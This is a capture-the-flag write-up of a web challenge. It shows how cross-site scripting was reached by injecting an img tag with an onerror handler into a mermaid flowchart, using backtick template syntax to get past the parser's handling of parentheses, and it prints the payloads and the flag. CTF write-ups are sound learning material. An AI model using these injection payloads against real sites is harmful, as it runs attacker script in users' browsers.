# Marcozuckerbergo

**Category**: Web

135 Points

108 Solves

**Problem description**: Fine, I'll use a damn lib. Let's see if it's any better. 

---

We quickly note that the challenge is written using the mermaid library. Similar to how we did the first challenge, we looked for a way to embed an image into a mermaid flowchart, and found this link: https://github.com/knsv/mermaid/issues/548

```
graph LR; D-->X((<img src='/address/to/image.png' width=5>))
```

Was a valid graph that we used. Next, we did injection:

```
graph LR; D-->X((<img src='/address/to/image.png' width=5 onerror='javascript:alert(1)' >))
```

Unfortunately, this no worko because it sees the `(` and `)` in the onerror, tries to parse them, and breaks. Thankfully my teammate told me that I can use \` instead of parentheses in javascript, so this worked:

```
graph LR; D-->X((<img src='/address/to/image.png' width=5 onerror='javascript:alert`1`' >))
```

We submit this in the URL for the flag.

`midnight{1_gu3zz_7rust1ng_l1bs_d1dnt_w0rk_3ither:(}`